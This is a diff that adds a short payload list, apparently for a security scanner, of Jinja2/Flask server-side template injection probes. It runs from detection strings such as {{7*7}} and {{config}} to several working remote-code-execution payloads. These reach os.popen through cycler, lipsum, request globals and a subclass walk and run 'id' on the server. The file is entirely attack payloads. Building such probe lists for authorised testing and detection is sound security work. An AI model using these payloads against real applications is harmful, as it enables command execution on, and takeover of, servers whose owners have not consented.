@@ -1,0 +1,14 @@
+# ssti/jinja — Jinja2 / Flask SSTI probes (also catches Flask + Werkzeug)
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{config.items()}}
+{{request}}
+{{self}}
+{{self.__class__}}
+{{self.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{%for x in ().__class__.__base__.__subclasses__()%}{%if "warning" in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}
